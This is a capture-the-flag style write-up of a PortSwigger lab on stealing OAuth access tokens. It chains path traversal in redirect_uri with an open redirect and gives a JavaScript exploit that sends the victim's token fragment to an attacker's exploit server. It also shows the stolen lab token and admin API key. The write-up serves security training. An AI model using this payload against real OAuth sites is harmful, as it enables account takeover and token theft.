# Oauth
portswigger OAUTH labs solutions


<h1>Lab: Stealing OAuth access tokens via an open redirect</h1>

First burp intercept and login as a normal then logout and again login , 

Found in http history tab it is very intresting

![image](https://user-images.githubusercontent.com/81432466/215782361-ed504ad1-605d-4f5e-b669-a7583f413420.png)

here is perameter 

GET /auth?client_id=z5msptbdrcm0kgpf04x09&redirect_uri=https://0a8a0035035939c9c42e2a91003c000d.web-security-academy.net/oauth-callback&response_type=token&nonce=316026412&scope=openid%20profile%20email HTTP/1.

But when i try to add another domin in redirect_uri param then i got 404 response because application is whitelisted but application have directory traversal issue. So i tried /../exapmle.com after call back

![image](https://user-images.githubusercontent.com/81432466/215783412-c23a04ea-309a-4c35-a3c1-376cc9ee27a8.png)

So here was may be i can found open redriect so i tried internal url path because application is whitelisted.

![image](https://user-images.githubusercontent.com/81432466/215783837-b99a75e5-649d-4152-a535-b8af5d526de5.png)

so i add this internal path after call back and i did intercept off

![image](https://user-images.githubusercontent.com/81432466/215784291-1ad4085a-f657-40e1-a8bb-135aa0c17261.png)

and i redirected on post?postId=4 blog page

I have found another new intresting thing

![image](https://user-images.githubusercontent.com/81432466/215785272-20c84a26-b99a-4b1e-abf9-a80f6a1cec84.png)

So i tried if i add this path so can we bypass whitelisted function.  so i tried again logout and intercept callback request again 

![image](https://user-images.githubusercontent.com/81432466/215786185-f45549aa-d413-4f36-a3d0-e140b8c19ec2.png)

and i did intercept off and i got 

![image](https://user-images.githubusercontent.com/81432466/215786326-799c6da3-8ccd-4add-a235-1bcb407ae4b8.png)

So i tried exploit server path and same i got hello world.

<h2>Now Time to exploit</h2>

Add exploit server path 
![image](https://user-images.githubusercontent.com/81432466/215787126-fb4b2e5a-8399-47f1-b2b9-51393049eaef.png)

<h2>Below is exploit code</h2>

<script>
    if (!document.location.hash) {
        window.location = 'https://YOUR-LAB-OAUTH-SERVER.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>

![image](https://user-images.githubusercontent.com/81432466/215787677-586a0fd9-47b6-4ee9-a8b8-01e549b89715.png)

Now i sent to this exploit to victim via click to deliver to victim button. And check /?access_token=QjQfXz5-OfbZ8tXuPnTpqaUZc8A93XeTeIsDAkkS63T

Now i check my http history tab coz i was login winner account 

And i have found

![image](https://user-images.githubusercontent.com/81432466/215788574-4607a91b-0fc3-4a93-96fc-9a5a8a86bc36.png)

it is winner account token but i got admin token 

I replaced that token

![image](https://user-images.githubusercontent.com/81432466/215788921-0264376e-66dd-4f45-9e46-758a9bc624d5.png)

And got admin keys

{"sub":"administrator","apikey":"KWshIhEjr8QhVDNb7U6yhs0xHz6hxcdq","name":"Administrator","email":"administrator@normal-user.net","email_verified":true}

Now time to submit this key

KWshIhEjr8QhVDNb7U6yhs0xHz6hxcdq

![image](https://user-images.githubusercontent.com/81432466/215789243-8855be71-b3ed-4ae9-8c2e-f99d60051025.png)


===============================================================================================================================================================









